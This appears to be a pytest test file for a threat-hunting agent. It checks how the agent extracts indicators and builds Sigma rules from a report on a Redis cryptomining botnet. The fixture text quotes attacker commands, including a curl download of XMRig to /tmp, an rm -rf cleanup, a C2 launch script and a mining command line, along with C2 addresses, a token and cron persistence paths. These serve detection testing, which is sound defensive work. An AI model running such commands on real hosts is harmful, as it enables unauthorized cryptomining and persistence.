"""Defects the Redis cryptomining botnet gold case found (hunt.io, an exposed operator directory).

The report describes Linux servers compromised with no user involved, and most
of its text is about the operator's own Windows machine and toolkit. The first
replay scored 40/53: no server-side tradecraft in the technique catalog, a
token and a TLS fingerprint routed as file hashes, ports and cron paths that
never reached a rule, the article read twice, and the operator's own files
treated as files the malware writes.
"""

import json
from dataclasses import asdict
from typing import Any, Dict, List

import pytest
import yaml

from hecate_agent.agents.llm.sigma_generator import SigmaGenerationInput, SigmaGeneratorAgent, rule_filenames
from hecate_agent.core import source_evidence as se
from hecate_agent.core.command_rules import command_candidates
from hecate_agent.core.platform_evidence import platform_evidence
from hecate_agent.core.provenance import IndicatorRecord, attach_text_ports, merge_records, placements, records_from_cti
from hecate_agent.core.query_literals import literals_from_artifacts
from hecate_agent.core.technique_evidence import map_behaviours, passage_status, sentence_status

TOKEN = "f90c8b1dcd374d4f552744ee1765583d"
PIN = "420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a"
C2 = "188.245.99.156"
URL = "https://report.example/redis"

#: The report's shape: inline elements and table cells each on their own line.
PAGE = f"""A rogue Redis server on ports 16379 through 16385 at
188.245[.]99.156
delivers the RDB blob, which the victim writes verbatim to /etc/cron.d/.redis-miner.
The cron job pulls XMRig and runs the hidden /tmp/.xmrig binary against
pool.moneroocean[.]stream
:443 over TLS.
A batch script, start_c2.bat, launches the operator's C2 server component directly:
set
C2_TOKEN={TOKEN}
start /B C:\\host_public\\python311\\python.exe -u c2_persist.py 10000 0.0.0.0
Copy
Compromised hosts check in over plain HTTP GETs of the form
http://<c2-host>:10000/ping?h=<hostname>
, a lightweight heartbeat.
The newest payload adds --tls-fingerprint={PIN}. That pins the pool certificate.
Two batch scripts run a locally staged copy of XMRig right on the operator's own host:
C:\\Users\\Public\\xmrig\\xmrig.exe -o 45.155.102.89:10128
Copy
The operator works from redis_fleet.txt, a target list sitting in the directory next to rogue.py.
Indicators of Compromise
188.245[.]99.156
:10000
IP:port
C2 callback endpoint
188.245[.]99.156
:16379--16385
IP:port range
Rogue Redis replication ports
47.250[.]92.230
IP
Most frequently reused QA/test target (ownership unconfirmed)
34.166[.]99.116
,
213.6[.]207.123
IP
Additional observed dev/QA targets, ownership unconfirmed
194.48.248[.]105
:8081
IP:port
Earlier (Feb 2026), separate open directory linked by wallet reuse
{PIN}
TLS fingerprint
Pinned pool certificate, most recent payload variant only
/etc/cron.hourly/redis-miner
Fallback cron persistence path
"""


def _artifact(value: str, kind: str, **extra: Any) -> Dict[str, Any]:
    return {"value": value, "kind": kind, "role": "unknown", "status": "active", "evidence": "", **extra}


def _extract(*artifacts: Dict[str, Any]) -> se.SourceEvidence:
    return se.extract_source_evidence(URL, page_text=PAGE, complete=lambda _: json.dumps({"artifacts": list(artifacts)}))


def _no_reply(_: List[Dict[str, str]]) -> str:
    return json.dumps({"artifacts": []})


# --- The page ---------------------------------------------------------------------------------


def test_a_second_copy_of_the_article_is_removed() -> None:
    paragraphs = [
        f"Paragraph {n} of the article, long enough to be a line of prose and not a heading. " * 3 for n in range(12)
    ]
    body = "\n".join(["TABLE OF CONTENTS", "Key Findings", *paragraphs, "Conclusion"])
    page = f"Nav\nBlog\n{body}\n{body}\nFooter"
    assert se.strip_repeated_body(page) == f"Nav\nBlog\n{body}\nFooter"


def test_repeated_short_lines_are_not_a_second_copy() -> None:
    page = (
        "IP\nRole\n"
        + "A sentence that appears twice in a report, as a pull quote does, and is longer than a heading.\n" * 2
        + "IP\nRole"
    )
    assert se.strip_repeated_body(page) == page


def test_a_related_posts_heading_split_across_lines_ends_the_article() -> None:
    page = "The article body. " * 40 + "\nRelated\nPosts\nAnother campaign that used PowerShell on Windows."
    assert "PowerShell" not in se.strip_page_furniture(page)


# --- Values that are not indicators -----------------------------------------------------------


def test_a_token_and_a_certificate_fingerprint_are_not_file_hashes() -> None:
    assert se.non_file_passage(PAGE, TOKEN) == f"C2_TOKEN={TOKEN}"
    assert se.non_file_passage(PAGE, PIN) == f"--tls-fingerprint={PIN}"
    assert se.non_file_passage(f"{PIN}\nTLS fingerprint\nPinned pool certificate", PIN) == f"{PIN} TLS fingerprint"
    assert se.non_file_passage(f"Go loader SHA-256 {PIN}", PIN) == ""


def test_feed_hashes_the_report_shows_are_a_token_and_a_fingerprint_get_no_rule() -> None:
    evidence = _extract(_artifact(TOKEN, "md5", role="executable", evidence="launches the operator's C2 server component"))
    records = se.build_indicator_records({"FileHash-MD5": [TOKEN], "FileHash-SHA256": [PIN]}, evidence, _no_reply)
    hashes = {r.value: r for r in records if r.type in ("md5", "sha256")}
    assert {r.role for r in hashes.values()} == {"non_file"}
    assert [placements(r) for r in hashes.values()] == [[], []]
    assert hashes[TOKEN].evidence == f"C2_TOKEN={TOKEN}" and hashes[PIN].source == URL


def test_a_template_url_and_a_bind_address_are_dropped() -> None:
    evidence = _extract(
        _artifact("http://<c2-host>:10000/ping?h=<hostname>", "url", role="c2"),
        _artifact("0.0.0.0", "ipv4", role="c2"),
        _artifact(C2, "ipv4", role="c2"),
    )
    assert [r.value for r in evidence.indicators] == [C2]
    assert any("not a well-formed url" in d for d in evidence.dropped)
    assert any("0.0.0.0: not a routable address" in d for d in evidence.dropped)


# --- Ports ------------------------------------------------------------------------------------


def test_ports_written_beside_an_address_scope_its_rule() -> None:
    records = [IndicatorRecord(C2, "ipv4", role="c2", status="active"), IndicatorRecord("pool.moneroocean.stream", "domain")]
    attach_text_ports(records, PAGE)
    assert records[0].ports == [10000, *range(16379, 16386)]
    assert records[1].ports == [443]


@pytest.mark.parametrize(
    ("text", "ports"),
    [
        ("outbound HTTP to 188.245.99.156 on port 10000", [10000]),
        ("A rogue server on port 9000 at 188.245.99.156 delivers the blob", [9000]),
        # How someone else saw the port is not this intrusion's traffic.
        ("We found it on port 80 at 188.245.99.156 and pulled the files", []),
        ("MEDIUM confidence 188.245.99.156:40010 ThreatFox-derived VShell sighting, 2026-04-15", []),
        ("A feed listed\n188.245.99.156:40010\nas VShell in April, months before this sample", []),
        ("Certificates for the hostname show up on\n188.245.99.156\n:8081, confirming it never resolved elsewhere", []),
        # A port with any mention as a service is kept, whatever else is said of it.
        ("188.245.99.156:8443 was indexed in May.\nThe implant's C2 check-in goes to 188.245.99.156:8443", [8443]),
        # Nothing said either way: kept.
        ("188.245.99.156:8133\nIP address and nonstandard http port", [8133]),
        ("scanned 188.245.99.156:1024-65535", []),  # a scan range, not service ports
        ("188.245.99.156: 147 files were recovered", []),  # a count, not a port
        ("connects to 8.188.245.99.156:9000", []),  # a different, longer value
    ],
)
def test_port_wording(text: str, ports: List[int]) -> None:
    record = IndicatorRecord(C2, "ipv4")
    attach_text_ports([record], text)
    assert record.ports == ports


def test_a_table_row_is_judged_by_its_own_cells_not_its_neighbours() -> None:
    table = (
        "HIGH confidence 38.207.178.192:50813 HTTP staging and DOCX decoy\n"
        "HIGH confidence 38.207.178.192:50812 SNOWLIGHT check-in and VShell transfer\n"
        "MEDIUM confidence 38.207.178.192:40010 ThreatFox-derived VShell sighting, 2026-04-15\n"
    )
    record = IndicatorRecord("38.207.178.192", "ipv4", role="c2", status="active")
    attach_text_ports([record], table)
    assert record.ports == [50812, 50813]


def test_a_hostnames_port_is_not_given_to_its_parent_domain() -> None:
    records = [IndicatorRecord("ayakliborsa.net", "domain"), IndicatorRecord("socket.ayakliborsa.net", "hostname")]
    attach_text_ports(records, "socket.ayakliborsa[.]net:8081 served the directory")
    assert [r.ports for r in records] == [[], [8081]]


def test_one_name_listed_as_domain_and_hostname_is_one_record() -> None:
    feed = records_from_cti({"hostname": ["socket.ayakliborsa.net"]})
    merged = merge_records(
        feed, [IndicatorRecord("socket.ayakliborsa.net", "domain", role="c2", status="active", evidence="x")]
    )
    assert [(r.type, r.role) for r in merged] == [("hostname", "c2")]


# --- Addresses the actor aimed at, or used elsewhere ------------------------------------------


@pytest.mark.parametrize(
    ("value", "role"),
    [
        ("47.250.92.230", "target"),
        ("34.166.99.116", "target"),  # shares a role cell with the address after it
        ("213.6.207.123", "target"),
        ("194.48.248.105", "historical"),  # a separate, earlier operation
        (C2, ""),  # "C2 callback endpoint": a role victims would see always wins
    ],
)
def test_the_reports_own_words_fix_an_address_role(value: str, role: str) -> None:
    assert se.network_role_from_context(PAGE, value)[0] == role


def test_target_and_other_operation_addresses_get_no_rule_whatever_the_model_said() -> None:
    evidence = _extract(
        _artifact("47.250.92.230", "ipv4", role="c2", evidence="Most frequently reused QA/test target"),
        _artifact("194.48.248.105:8081", "ipv4", role="c2", evidence="separate open directory linked by wallet reuse"),
        _artifact(C2, "ipv4", role="c2", evidence="C2 callback endpoint"),
    )
    records = {r.value: r for r in se.build_indicator_records({"IPv4": ["213.6.207.123"]}, evidence, _no_reply)}
    assert {v: (r.role, r.ports) for v, r in records.items() if not placements(r)} == {
        "47.250.92.230": ("target", []),
        "194.48.248.105": ("historical", []),
        "213.6.207.123": ("target", []),
    }
    assert placements(records[C2]) == ["network_connection.DestinationIp"] and 10000 in records[C2].ports


# --- A name beside a longer name that contains it ---------------------------------------------

REGISTRY_PAGE = """Correction:
socket.ayakliborsa[.]net
is live operator infrastructure, not a stale pivot. Its A record pointed at
188.245[.]99.156
continuously through the day of this pass, and the C2 callback endpoint sits on that address.
The domain's registration history adds one more wrinkle:
ayakliborsa.net
passed through at least four different nameserver providers before landing on its current
host around its October 2024 re-registration, which is ordinary churn for a previously-expired domain.
Figure 23. Nameserver history for the
ayakliborsa.net
apex domain.
Indicators of Compromise
socket.ayakliborsa[.]net
Domain
Live operator-controlled hostname
11.188.245.99
Address
Unrelated address that merely contains part of another
"""


def test_a_parent_domain_is_read_by_its_own_mentions_not_its_subdomains() -> None:
    """A search for the parent also found every line about the live hostname under it."""
    own = se._local_contexts(REGISTRY_PAGE, "ayakliborsa.net")
    assert len(own) == 2 and all("registration history" in c or "Nameserver history" in c for c in own)
    assert len(se._local_contexts(REGISTRY_PAGE, "socket.ayakliborsa.net")) == 2
    assert len(se._contexts(REGISTRY_PAGE, "ayakliborsa.net", limit=9)) == 2
    assert len(se._contexts(REGISTRY_PAGE, "socket.ayakliborsa.net", limit=9)) == 2


@pytest.mark.parametrize(
    ("text", "value", "found"),
    [
        ("resolves c2.example.net today", "example.net", False),
        ("the certificate covers *.example.net only", "example.net", True),
        ("fetched http://example.net/a.sh, then", "example.net", True),
        ("example.net.cn is someone else's", "example.net", False),
        ("seen at 11.2.3.4 once", "1.2.3.4", False),
        ("seen at 1.2.3.4:8080 once", "1.2.3.4", True),
        ("ended the sentence with example.net.", "example.net", True),
    ],
)
def test_a_value_is_matched_where_it_stands_by_itself(text: str, value: str, found: bool) -> None:
    assert bool(se._local_contexts(text, value)) is found


def test_a_name_given_only_its_registry_history_gets_no_rule() -> None:
    """The feed listed the parent beside its live hostname; the report gave the parent's nameserver history alone."""
    assert se.network_role_from_context(REGISTRY_PAGE, "ayakliborsa.net")[:2] == ("historical", "historical")
    assert se.network_role_from_context(REGISTRY_PAGE, "socket.ayakliborsa.net")[0] == ""
    evidence = se.extract_source_evidence("https://report.example/redis", page_text=REGISTRY_PAGE, complete=_no_reply)
    feed = {"domain": ["ayakliborsa.net"], "hostname": ["socket.ayakliborsa.net"]}
    records = {r.value: r for r in se.build_indicator_records(feed, evidence, _no_reply)}
    assert records["ayakliborsa.net"].role == "historical" and not placements(records["ayakliborsa.net"])
    assert "registration history" in records["ayakliborsa.net"].evidence
    # With no classification reply, the primary-source hostname is unclassified,
    # rather than a curated feed IOC. It waits for a supported current role.
    assert records["socket.ayakliborsa.net"].role == "unknown"
    assert records["socket.ayakliborsa.net"].source == evidence.url
    assert not placements(records["socket.ayakliborsa.net"])


@pytest.mark.parametrize(
    "text",
    [
        "The C2 domain evil-updates.net was registered two days before the campaign.",
        "evil-updates.net was registered on 2026-05-01 and resolves to the staging server.",
        "evil-updates.net was registered on 2026-05-01 through a privacy-redacted registrar.",
        "Its nameserver history is unremarkable, but evil-updates.net served the payload throughout.",
    ],
)
def test_a_registration_date_beside_a_name_in_use_changes_nothing(text: str) -> None:
    """Reports give a live domain's registration date all the time; only a name with nothing but history is a record."""
    assert se.network_role_from_context(text, "evil-updates.net") == ("", "", "")


# --- Persistence files ------------------------------------------------------------------------


def test_files_under_persistence_directories_are_found_without_the_model() -> None:
    found = {a.value: a for a in se.persistence_file_artifacts(PAGE)}
    assert set(found) == {"/etc/cron.d/.redis-miner", "/etc/cron.hourly/redis-miner"}
    assert all(a.kind == "file_path" and a.status == "active" for a in found.values())
    assert "writes verbatim" in found["/etc/cron.d/.redis-miner"].evidence


def test_a_directory_alone_or_an_unobserved_path_is_not_a_persistence_file() -> None:
    text = (
        "Audit /etc/cron.d/ and /var/spool/cron/crontabs for entries. The tool can also write /etc/cron.d/backdoor on request."
    )
    assert se.persistence_file_artifacts(text) == []


def test_persistence_files_become_written_file_rules() -> None:
    evidence = _extract()
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="Redis rogue replication writes a cron entry.",
            justification="",
            techniques=["T1053.003"],
            platforms=["Linux"],
            source_artifacts=[asdict(a) for a in evidence.artifacts],
        )
    )
    targets = [yaml.safe_load(rule.rule_yaml)["detection"]["selection"] for rule, _ in built if rule]
    assert {"TargetFilename": "/etc/cron.d/.redis-miner"} in targets


def test_rules_for_files_with_the_same_name_each_get_their_own_file() -> None:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    paths = ["/etc/cron.d/.redis-miner", "/etc/cron.d/redis-miner", "/etc/cron.hourly/redis-miner", "/tmp/.xmrig"]
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="Redis rogue replication writes a cron entry.",
            justification="",
            techniques=["T1053.003"],
            platforms=["Linux"],
            source_artifacts=[_artifact(p, "file_path", role="persistence file", evidence=f"writes {p}") for p in paths],
        )
    )
    names = rule_filenames([rule for rule, _ in built if rule])
    assert len(names) == len(set(names)) == 4
    assert names[1] == names[0][:-4] + "_2.yml" and names[2] == names[0][:-4] + "_3.yml"


# --- Tags and severity of deterministic rules --------------------------------------------------


def _file_rules(paths: List[str], techniques: List[str]) -> Dict[str, Dict[str, Any]]:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="A cron entry is written.",
            justification="",
            techniques=techniques,
            platforms=["Linux"],
            source_artifacts=[_artifact(p, "file_path", role="persistence file", evidence=f"writes {p}") for p in paths],
        )
    )
    rules = [yaml.safe_load(rule.rule_yaml) for rule, _ in built if rule]
    return {r["detection"]["selection"]["TargetFilename"]: r for r in rules}


def test_a_deterministic_rule_is_tagged_with_the_technique_its_own_text_shows() -> None:
    rules = _file_rules(
        ["/etc/cron.d/backup-sync", "/tmp/.cache-worker", "/opt/app/data.bin"], ["T1053.003", "T1564.001", "T1105"]
    )
    assert rules["/etc/cron.d/backup-sync"]["tags"] == ["attack.t1053.003"]
    assert rules["/tmp/.cache-worker"]["tags"] == ["attack.t1564.001"]
    assert rules["/opt/app/data.bin"]["tags"] == []  # the path shows no technique


def test_a_tag_never_adds_a_technique_the_hunt_does_not_map() -> None:
    assert _file_rules(["/etc/cron.d/backup-sync"], ["T1105"])["/etc/cron.d/backup-sync"]["tags"] == []


def test_a_command_rule_is_tagged_from_its_command() -> None:
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    text = "The loader then ran xattr -d com.apple.quarantine /tmp/payload on the Mac."
    built = agent._command_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="Quarantine is removed.",
            justification="",
            techniques=["T1553.001", "T1105"],
            platforms=["macOS"],
            observed_commands=command_candidates(text, ["macOS"]),
        )
    )
    ((rule, _),) = built
    assert yaml.safe_load(rule.rule_yaml)["tags"] == ["attack.t1553.001"] and rule.techniques == ["T1553.001"]  # type: ignore


@pytest.mark.parametrize(
    ("path", "level"),
    [
        ("/var/spool/cron/crontabs/root", "low"),  # root's crontab: any edit of it matches
        ("/var/spool/cron/deploy", "low"),
        ("/home/svc/.ssh/authorized_keys", "low"),
        ("/etc/cron.d/backup-sync", "high"),  # a file the actor named
        ("/tmp/.cache-worker", "high"),
    ],
)
def test_a_rule_on_a_shared_system_file_is_a_low_level_lead(path: str, level: str) -> None:
    rule = _file_rules([path], [])[path]
    assert rule["level"] == level
    assert ("administrators write this file too" in rule["description"]) is (level == "low")


# --- Server-side tradecraft -------------------------------------------------------------------


@pytest.mark.parametrize(
    ("sentence", "technique"),
    [
        ("The operation exploited unauthenticated Redis instances using rogue replication.", "T1190"),
        ("The tooling issues SLAVEOF and the victim accepts a crafted RDB blob from the rogue master.", "T1190"),
        ("The cron job deployed XMRig miners on every victim.", "T1496"),
        ("The miner gets renamed to a dot-prefixed hidden file (/tmp/.xmrig).", "T1564.001"),
        ("The same cron job pings c2_persist.py with a plain HTTP GET.", "T1071.001"),
        ("Compromised hosts check in over plain unauthenticated HTTP GETs.", "T1071.001"),
        ("Watch for outbound HTTP to 188.245.99.156 on port 10000 (the C2 check-in).", "T1571"),
        ("188.245.99.156:10000 is the C2 callback endpoint.", "T1571"),
        ("The payload runs rm -rf /tmp/x.tgz /tmp/xmrig-* once the miner is in place.", "T1070.004"),
        (
            "The payload runs curl -sLk 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/x.tar.gz' -o /tmp/x.tgz",
            "T1105",
        ),
    ],
)
def test_server_side_behaviour_maps_to_its_technique(sentence: str, technique: str) -> None:
    assert technique in {e.technique_id for e in map_behaviours([("primary source", sentence)]) if e.status == "observed"}


def test_c2_on_a_standard_port_is_not_a_non_standard_port() -> None:
    found = map_behaviours([("primary source", "The implant's C2 check-in goes to 203.0.113.9 on port 443.")])
    assert "T1571" not in {e.technique_id for e in found}


# --- The actor's own side ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "sentence",
    [
        "An exposed directory revealed a cryptomining toolkit including Windows registry hives.",
        "The operator runs local cryptomining on their own host using the same wallet.",
        "We pulled 147 files: Python exploit source, campaign-result logs and two exported Windows registry hives.",
        "There are two obfuscation techniques in the toolkit, both narrow.",
        "47.250.92.230 is the most-reused QA target, hardcoded across deploy_all.py.",
    ],
)
def test_a_sentence_about_the_actors_own_machine_or_toolkit_is_context(sentence: str) -> None:
    assert sentence_status(sentence) == "context"


def test_a_sentence_that_also_says_what_happened_on_a_victim_stays_evidence() -> None:
    sentence = "The operator's own server delivers the RDB blob into a victim's cron.d entry."
    assert sentence_status(sentence) == "observed"


def test_a_quoted_block_takes_the_side_of_the_clause_that_introduces_it() -> None:
    lead = "Padding sentence without a full stop so the segment runs on " * 6
    segment = (
        f"{lead} two batch scripts run a locally staged copy of XMRig right on the operator's own host: "
        'cd /d "C:\\Users\\Public\\xmrig" C:\\Users\\Public\\xmrig\\xmrig.exe -o 45.155.102.89:10128 -t 4 --keepalive '
        + "--donate-level 0 " * 20
    )
    at = segment.index("xmrig.exe")
    assert passage_status(segment, at, at + 9)[0] == "context"


def test_the_operators_windows_machine_does_not_scope_the_hunt_to_windows() -> None:
    evidence = platform_evidence([PAGE + "\nVictims ran Linux: the ELF miner was started by crontab under systemd hosts."])
    assert evidence.supported == ["Linux"]


def test_an_artifact_on_the_actors_own_machine_is_untied_from_the_intrusion() -> None:
    evidence = _extract(
        _artifact("redis_fleet.txt", "file_path", role="target list", evidence="The operator works from redis_fleet.txt"),
        _artifact("xmrig.exe", "process", role="miner", evidence="two batch scripts run a locally staged copy of XMRig"),
        _artifact("/tmp/.xmrig", "file_path", role="hidden binary", evidence="runs the hidden /tmp/.xmrig binary"),
    )
    by_value = {a.value: a for a in evidence.artifacts}
    assert (by_value["redis_fleet.txt"].role, by_value["redis_fleet.txt"].status) == (se.ATTACKER_SIDE_ROLE, "unknown")
    assert by_value["xmrig.exe"].role == se.ATTACKER_SIDE_ROLE
    assert by_value["/tmp/.xmrig"].status == "active"
    literals = [lit.sigma for lit in literals_from_artifacts([asdict(a) for a in evidence.artifacts], ["Linux"])]
    assert "/tmp/.xmrig" in literals and not {"redis_fleet.txt", "\\xmrig.exe"} & set(literals)


def test_a_victim_side_path_in_a_capability_sentence_stays_tied_to_the_intrusion() -> None:
    page = "The malware supports persistence by deploying a payload at /Users/<redacted>/Library/Caches/x/SoftwareUpdate."
    evidence = se.extract_source_evidence(
        URL,
        page_text=page,
        complete=lambda _: json.dumps(
            {"artifacts": [_artifact("/Users/<redacted>/Library/Caches/x/SoftwareUpdate", "file_path", evidence=page)]}
        ),
    )
    assert [(a.role, a.status) for a in evidence.artifacts] == [("unknown", "active")]


def test_a_full_path_is_tied_to_the_intrusion_when_its_file_is() -> None:
    """Huntress named the stealer in prose and gave its full path in the IOC table."""
    page = (
        "It copies the downloaded malware executable to this directory, under the name com.apple.verified.\n"
        "$HOME/Library/Caches/com.apple.trustd/com.apple.verified\nFilesystem path used by this malware\n"
        "And maybe do not let personal_resume.exe join the lab.\n"
    )
    replies = [
        _artifact(
            "com.apple.verified",
            "file_path",
            role="malware executable",
            evidence="It copies the downloaded malware executable to this directory, under the name com.apple.verified.",
        ),
        _artifact("$HOME/Library/Caches/com.apple.trustd/com.apple.verified", "file_path", status="unknown"),
        _artifact("personal_resume.exe", "file_path", status="unknown"),
    ]
    evidence = se.extract_source_evidence(URL, page_text=page, complete=lambda _: json.dumps({"artifacts": replies}))
    by_value = {a.value: a for a in evidence.artifacts}
    full = by_value["$HOME/Library/Caches/com.apple.trustd/com.apple.verified"]
    assert (full.status, full.role) == ("active", "malware executable")
    assert by_value["personal_resume.exe"].status == "unknown"  # nothing ties it: still left out


# --- A report written from the actor's own material --------------------------------------------

OPENING = (
    "Most open directories hold a payload and little else. This one held the operator's entire working toolkit, "
    "and everything in this report traces back to the operator's own files.\n"
)
TOOLKIT_REPORT = OPENING + (
    "wp_spray.py sprays credentials across the fleet and writes wp_scan_results.json.\n"
    "Two files, SAM.save and SYSTEM.save, checked out as genuine exported registry hives.\n"
    "On each victim the cron job downloads loader.sh and writes /tmp/.cache-worker.\n"
    "The payload is fetched from https://example.org/releases/miner.tgz by the same job.\n"
)


def test_a_report_says_at_its_opening_when_it_was_written_from_the_actors_files() -> None:
    from hecate_agent.core.technique_evidence import actor_material_report

    assert actor_material_report(TOOLKIT_REPORT)
    assert not actor_material_report("The sample was found in an open directory. It drops a loader and beacons home.")
    assert not actor_material_report("A fake resume opens a decoy and installs a RAT on the recipient's workstation.")


@pytest.mark.parametrize(
    ("value", "actors"),
    [
        ("wp_spray.py", True),  # a tool named by itself
        ("wp_scan_results.json", True),
        ("SAM.save", True),  # no tool wording, but a bare file never tied to a victim
        ("loader.sh", False),  # named beside what happens on a victim
        ("/tmp/.cache-worker", False),  # has a location
        ("miner.tgz", False),  # appears only inside a URL
    ],
)
def test_in_such_a_report_a_file_named_without_a_victim_is_the_actors(value: str, actors: bool) -> None:
    assert bool(se.attacker_side_passage(TOOLKIT_REPORT, value)) is actors


def test_the_same_file_names_in_an_ordinary_report_are_not_the_actors() -> None:
    ordinary = TOOLKIT_REPORT.replace(OPENING, "The dropper unpacks its tools on the workstation.\n")
    assert not any(se.attacker_side_passage(ordinary, v) for v in ("wp_spray.py", "SAM.save", "loader.sh"))


def test_a_technique_is_not_mapped_from_the_actors_own_tool() -> None:
    text = OPENING + "The loader script boot.py base64-decodes the payload before running it.\n"
    assert "T1140" not in {e.technique_id for e in map_behaviours([("primary source", text)])}
    victim = OPENING + "On each victim the dropper base64-decodes the payload before running it.\n"
    assert "T1140" in {e.technique_id for e in map_behaviours([("primary source", victim)])}


def test_prose_values_from_the_actors_side_or_another_platform_are_reported() -> None:
    from hecate_agent.core.claim_audit import prose_value_reasons

    prose = ["Execution of wp_spray.py and python.exe; the cron job writes /tmp/.cache-worker and loader.sh."]
    reasons = prose_value_reasons(prose, TOOLKIT_REPORT, ["Linux"])
    assert set(reasons) == {"wp_spray.py", "python.exe"}
    assert "actor's own side" in reasons["wp_spray.py"] and "Windows artifact" in reasons["python.exe"]
    # Platforms unknown: nothing is ruled out as off-platform.
    assert set(prose_value_reasons(prose, TOOLKIT_REPORT, [])) == {"wp_spray.py"}
    # On a Windows hunt the same .exe is where it belongs.
    assert "python.exe" not in prose_value_reasons(prose, "", ["Windows"])


OBSERVED_PATHS = (
    "The cron entry pulls the release and points the resulting hidden /tmp/.cache-worker binary at the pool.\n"
    "The implant can also write /var/lib/extra.bin when the operator asks for it.\n"
    "On the detection side, audit /etc/crontab for entries referencing curl.\n"
    "And maybe do not let notes.exe join the lab.\n"
)


@pytest.mark.parametrize(
    ("value", "status"),
    [
        ("/tmp/.cache-worker", "active"),  # the report shows it in observed activity
        ("/var/lib/extra.bin", "unknown"),  # only something the implant can do
        ("/etc/crontab", "unknown"),  # advice to the reader, not an observation
        ("notes.exe", "unknown"),  # no location: could be anywhere
    ],
)
def test_a_located_path_the_model_left_unverified_takes_its_status_from_the_report(value: str, status: str) -> None:
    """One replay returned /tmp/.xmrig with no passage, so the hidden miner had no rule."""
    evidence = se.extract_source_evidence(
        URL,
        page_text=OBSERVED_PATHS,
        complete=lambda _: json.dumps({"artifacts": [_artifact(value, "file_path", status="unknown")]}),
    )
    (artifact,) = evidence.artifacts
    assert artifact.status == status
    assert ("hidden /tmp/.cache-worker binary" in artifact.evidence) is (status == "active")


# --- Literals a hunt's platforms can show -----------------------------------------------------


def test_values_no_covered_platform_can_show_are_not_offered_to_rules() -> None:
    artifacts = [
        _artifact("C:\\host_public\\python311\\c2_persist.py", "file_path"),
        _artifact("/tmp/.xmrig", "file_path"),
        _artifact("xmrig", "process"),
    ]
    assert [lit.sigma for lit in literals_from_artifacts(artifacts, ["Linux"])] == ["/tmp/.xmrig", "/xmrig"]
    assert [lit.sigma for lit in literals_from_artifacts(artifacts, ["Windows"])] == [
        "C:\\host_public\\python311\\c2_persist.py",
        "\\xmrig.exe",
    ]
    assert len(literals_from_artifacts(artifacts)) == 3  # platforms unknown: nothing is ruled out


def test_a_file_name_does_not_supply_its_own_write_verb() -> None:
    (lit,) = literals_from_artifacts([_artifact("SAM.save", "file_path", evidence="SAM.save checked out as a genuine hive")])
    assert not lit.written


def test_a_bare_file_name_gets_no_written_file_rule() -> None:
    """A file event needs a location: SAM.save and fleet.b64 were in the operator's own directory."""
    agent = SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)
    built = agent._written_file_rules(
        SigmaGenerationInput(
            hunt_id="H-0001",
            hypothesis="The dropper writes its payload.",
            justification="",
            techniques=["T1105"],
            platforms=["Linux"],
            source_artifacts=[
                _artifact("kworkerd", "file_path", role="payload", evidence="The dropper writes kworkerd"),
                _artifact("/tmp/kworkerd", "file_path", role="payload", evidence="The dropper writes /tmp/kworkerd"),
            ],
        )
    )
    ((rule, _),) = built
    assert yaml.safe_load(rule.rule_yaml)["detection"]["selection"] == {"TargetFilename": "/tmp/kworkerd"}  # type: ignore
